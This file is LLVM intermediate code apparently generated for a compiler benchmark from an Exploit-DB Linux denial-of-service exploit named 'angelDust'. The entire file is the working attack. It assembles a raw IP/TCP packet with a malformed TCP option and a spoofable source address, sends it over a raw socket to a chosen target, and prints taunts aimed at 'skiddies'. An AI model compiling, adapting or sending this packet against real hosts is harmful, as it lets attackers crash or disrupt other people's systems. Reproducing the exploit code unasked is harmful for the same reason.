; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_25047.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_25047.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.option = type { i8*, i32, i8, i32* }
%struct.sockaddr_in = type { i8*, %struct.TYPE_5__, i32 }
%struct.TYPE_5__ = type { i8* }
%struct.ip = type { i32, i32, i32, i32, %struct.TYPE_6__, %struct.TYPE_4__, i64, i32, i64, i64, i64 }
%struct.TYPE_6__ = type { i8* }
%struct.TYPE_4__ = type { i8* }
%struct.tcphdr = type { i32, i32, i64, i64, i64, i64, i64, i64, i8*, i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [6 x i8] c"hD:S:\00", align 1
@__const.main.opts = private unnamed_addr constant [5 x i8] c"\06\00\FF\FF\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"angelDust by Antimatt3r\0A\00", align 1
@.str.2 = private unnamed_addr constant [38 x i8] c"pr0ps to Marcin for finding this bug\0A\00", align 1
@.str.3 = private unnamed_addr constant [68 x i8] c"pr0ps to me for making something useful out of it for the skiddies\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"destination_ip\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"source_ip\00", align 1
@__const.main.long_opts = private unnamed_addr constant [3 x %struct.option] [%struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i32 0, i8 0, i32* inttoptr (i64 104 to i32*) }, %struct.option { i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i32 0, i32 0), i32 1, i8 0, i32* inttoptr (i64 68 to i32*) }, %struct.option { i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i32 0, i32 0), i32 1, i8 0, i32* inttoptr (i64 83 to i32*) }], align 16
@.str.7 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@optarg = common dso_local global i8* null, align 8
@AF_INET = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"sendto\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [12 x i8] c"Sniff this\0A\00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"..............//\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"\08\08\08\08// \00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"\08\08\08\08\08\08// \00", align 1
@.str.14 = private unnamed_addr constant [12 x i8] c"\08\08\08\08\08\08\08\08// \00", align 1
@.str.15 = private unnamed_addr constant [14 x i8] c"\08\08\08\08\08\08\08\08\08\08// \00", align 1
@.str.16 = private unnamed_addr constant [17 x i8] c"\08\08\08\08\08\08\08\08\08\08\08\08// \0A\00", align 1
@.str.17 = private unnamed_addr constant [12 x i8] c"and choke!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca [5 x i8], align 1
  %10 = alloca [64 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 8
  %12 = alloca %struct.ip*, align 8
  %13 = alloca %struct.tcphdr*, align 8
  %14 = alloca [16 x i8], align 16
  %15 = alloca [16 x i8], align 16
  %16 = alloca [3 x %struct.option], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  %17 = bitcast [5 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %17, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.opts, i32 0, i32 0), i64 5, i1 false)
  %18 = getelementptr inbounds [64 x i8], [64 x i8]* %10, i64 0, i64 0
  %19 = bitcast i8* %18 to %struct.ip*
  store %struct.ip* %19, %struct.ip** %12, align 8
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %22, label %27

22:                                               ; preds = %2
  %23 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  %25 = call i32 @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.3, i64 0, i64 0))
  %26 = call i32 @exit(i32 -1) #4
  unreachable

27:                                               ; preds = %2
  %28 = bitcast [3 x %struct.option]* %16 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %28, i8* align 16 bitcast ([3 x %struct.option]* @__const.main.long_opts to i8*), i64 72, i1 false)
  %29 = getelementptr inbounds [16 x i8], [16 x i8]* %14, i64 0, i64 0
  %30 = call i32 @strncpy(i8* %29, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i32 16)
  %31 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  %32 = call i32 @strncpy(i8* %31, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i32 16)
  br label %33

33:                                               ; preds = %50, %27
  %34 = load i32, i32* %4, align 4
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds [3 x %struct.option], [3 x %struct.option]* %16, i64 0, i64 0
  %37 = call i32 @getopt_long(i32 %34, i8** %35, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0), %struct.option* %36, i32* null)
  store i32 %37, i32* %7, align 4
  %38 = load i32, i32* %7, align 4
  switch i32 %38, label %49 [
    i32 104, label %39
    i32 68, label %41
    i32 83, label %45
  ]

39:                                               ; preds = %33
  %40 = call i32 (...) @printUsage()
  store i32 0, i32* %3, align 4
  br label %172

41:                                               ; preds = %33
  %42 = getelementptr inbounds [16 x i8], [16 x i8]* %14, i64 0, i64 0
  %43 = load i8*, i8** @optarg, align 8
  %44 = call i32 @strncpy(i8* %42, i8* %43, i32 16)
  br label %49

45:                                               ; preds = %33
  %46 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i32 @strncpy(i8* %46, i8* %47, i32 16)
  br label %49

49:                                               ; preds = %33, %45, %41
  br label %50

50:                                               ; preds = %49
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, -1
  br i1 %52, label %33, label %53

53:                                               ; preds = %50
  %54 = bitcast [64 x i8]* %10 to i8**
  %55 = call i32 @memset(i8** %54, i32 0, i32 64)
  %56 = getelementptr inbounds [16 x i8], [16 x i8]* %14, i64 0, i64 0
  %57 = call i8* @inet_addr(i8* %56)
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %59 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %58, i32 0, i32 0
  store i8* %57, i8** %59, align 8
  %60 = call i8* @htons(i32 123)
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i8* %60, i8** %61, align 8
  %62 = load i32, i32* @AF_INET, align 4
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %62, i32* %63, align 8
  %64 = load %struct.ip*, %struct.ip** %12, align 8
  %65 = getelementptr inbounds %struct.ip, %struct.ip* %64, i32 0, i32 0
  store i32 5, i32* %65, align 8
  %66 = load %struct.ip*, %struct.ip** %12, align 8
  %67 = getelementptr inbounds %struct.ip, %struct.ip* %66, i32 0, i32 1
  store i32 4, i32* %67, align 4
  %68 = load %struct.ip*, %struct.ip** %12, align 8
  %69 = getelementptr inbounds %struct.ip, %struct.ip* %68, i32 0, i32 10
  store i64 0, i64* %69, align 8
  %70 = load %struct.ip*, %struct.ip** %12, align 8
  %71 = getelementptr inbounds %struct.ip, %struct.ip* %70, i32 0, i32 9
  store i64 0, i64* %71, align 8
  %72 = load %struct.ip*, %struct.ip** %12, align 8
  %73 = getelementptr inbounds %struct.ip, %struct.ip* %72, i32 0, i32 8
  store i64 0, i64* %73, align 8
  %74 = load %struct.ip*, %struct.ip** %12, align 8
  %75 = getelementptr inbounds %struct.ip, %struct.ip* %74, i32 0, i32 2
  store i32 64, i32* %75, align 8
  %76 = load i32, i32* @IPPROTO_TCP, align 4
  %77 = load %struct.ip*, %struct.ip** %12, align 8
  %78 = getelementptr inbounds %struct.ip, %struct.ip* %77, i32 0, i32 7
  store i32 %76, i32* %78, align 8
  %79 = load %struct.ip*, %struct.ip** %12, align 8
  %80 = getelementptr inbounds %struct.ip, %struct.ip* %79, i32 0, i32 3
  store i32 44, i32* %80, align 4
  %81 = load %struct.ip*, %struct.ip** %12, align 8
  %82 = getelementptr inbounds %struct.ip, %struct.ip* %81, i32 0, i32 6
  store i64 0, i64* %82, align 8
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %84 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %83, i32 0, i32 0
  %85 = load i8*, i8** %84, align 8
  %86 = load %struct.ip*, %struct.ip** %12, align 8
  %87 = getelementptr inbounds %struct.ip, %struct.ip* %86, i32 0, i32 5
  %88 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %87, i32 0, i32 0
  store i8* %85, i8** %88, align 8
  %89 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  %90 = call i8* @inet_addr(i8* %89)
  %91 = load %struct.ip*, %struct.ip** %12, align 8
  %92 = getelementptr inbounds %struct.ip, %struct.ip* %91, i32 0, i32 4
  %93 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %92, i32 0, i32 0
  store i8* %90, i8** %93, align 8
  %94 = getelementptr inbounds [64 x i8], [64 x i8]* %10, i64 0, i64 0
  %95 = load %struct.ip*, %struct.ip** %12, align 8
  %96 = getelementptr inbounds %struct.ip, %struct.ip* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 8
  %98 = shl i32 %97, 2
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %94, i64 %99
  %101 = bitcast i8* %100 to %struct.tcphdr*
  store %struct.tcphdr* %101, %struct.tcphdr** %13, align 8
  %102 = call i8* @htons(i32 321)
  %103 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %104 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %103, i32 0, i32 9
  store i8* %102, i8** %104, align 8
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %106 = load i8*, i8** %105, align 8
  %107 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %108 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %107, i32 0, i32 8
  store i8* %106, i8** %108, align 8
  %109 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 7
  store i64 0, i64* %110, align 8
  %111 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %112 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %111, i32 0, i32 6
  store i64 0, i64* %112, align 8
  %113 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %113, i32 0, i32 5
  store i64 0, i64* %114, align 8
  %115 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %116 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %115, i32 0, i32 0
  store i32 6, i32* %116, align 8
  %117 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 4
  store i64 0, i64* %118, align 8
  %119 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %120 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %119, i32 0, i32 1
  store i32 4096, i32* %120, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 3
  store i64 0, i64* %122, align 8
  %123 = load %struct.tcphdr*, %struct.tcphdr** %13, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 2
  store i64 0, i64* %124, align 8
  %125 = getelementptr inbounds [64 x i8], [64 x i8]* %10, i64 0, i64 0
  %126 = getelementptr inbounds i8, i8* %125, i64 40
  %127 = getelementptr inbounds [5 x i8], [5 x i8]* %9, i64 0, i64 0
  %128 = call i32 @memcpy(i8* %126, i8* %127, i32 5)
  %129 = load i32, i32* @PF_INET, align 4
  %130 = load i32, i32* @SOCK_RAW, align 4
  %131 = load i32, i32* @IPPROTO_RAW, align 4
  %132 = call i32 @socket(i32 %129, i32 %130, i32 %131)
  store i32 %132, i32* %6, align 4
  %133 = icmp eq i32 %132, -1
  br i1 %133, label %134, label %137

134:                                              ; preds = %53
  %135 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %136 = call i32 @exit(i32 0) #4
  unreachable

137:                                              ; preds = %53
  %138 = load i32, i32* %6, align 4
  %139 = getelementptr inbounds [64 x i8], [64 x i8]* %10, i64 0, i64 0
  %140 = load %struct.ip*, %struct.ip** %12, align 8
  %141 = getelementptr inbounds %struct.ip, %struct.ip* %140, i32 0, i32 3
  %142 = load i32, i32* %141, align 4
  %143 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %144 = call i32 @sendto(i32 %138, i8* %139, i32 %142, i32 0, %struct.sockaddr* %143, i32 24)
  %145 = icmp eq i32 %144, -1
  br i1 %145, label %146, label %149

146:                                              ; preds = %137
  %147 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %148 = call i32 @exit(i32 -1) #4
  unreachable

149:                                              ; preds = %137
  %150 = load i32, i32* @stderr, align 4
  %151 = call i32 @fprintf(i32 %150, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i64 0, i64 0))
  %152 = load i32, i32* @stderr, align 4
  %153 = call i32 @fprintf(i32 %152, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  %154 = call i32 @sleep(i32 1)
  %155 = load i32, i32* @stderr, align 4
  %156 = call i32 @fprintf(i32 %155, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i64 0, i64 0))
  %157 = call i32 @sleep(i32 1)
  %158 = load i32, i32* @stderr, align 4
  %159 = call i32 @fprintf(i32 %158, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0))
  %160 = call i32 @sleep(i32 1)
  %161 = load i32, i32* @stderr, align 4
  %162 = call i32 @fprintf(i32 %161, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.14, i64 0, i64 0))
  %163 = call i32 @sleep(i32 1)
  %164 = load i32, i32* @stderr, align 4
  %165 = call i32 @fprintf(i32 %164, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.15, i64 0, i64 0))
  %166 = call i32 @sleep(i32 1)
  %167 = load i32, i32* @stderr, align 4
  %168 = call i32 @fprintf(i32 %167, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.16, i64 0, i64 0))
  %169 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.17, i64 0, i64 0))
  %170 = load i32, i32* %6, align 4
  %171 = call i32 @close(i32 %170)
  store i32 0, i32* %3, align 4
  br label %172

172:                                              ; preds = %149, %39
  %173 = load i32, i32* %3, align 4
  ret i32 %173
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @getopt_long(i32, i8**, i8*, %struct.option*, i32*) #2

declare dso_local i32 @printUsage(...) #2

declare dso_local i32 @memset(i8**, i32, i32) #2

declare dso_local i8* @inet_addr(i8*) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
